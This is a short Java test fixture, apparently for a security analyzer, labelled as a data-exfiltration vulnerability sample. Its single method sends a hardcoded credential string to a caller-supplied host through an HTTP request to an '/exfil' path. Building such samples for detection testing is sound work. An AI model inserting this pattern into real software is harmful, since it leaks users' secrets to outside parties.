// Phase 11 (Track J.9) — Java DATA_EXFIL vuln fixture.
import java.net.HttpURLConnection;
import java.net.URL;

public class Vuln {
    public static void run(String host) throws Exception {
        String secret = "alice-creds";
        URL url = new URL("http://" + host + "/exfil?token=" + secret);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.connect();
        conn.disconnect();
    }
}
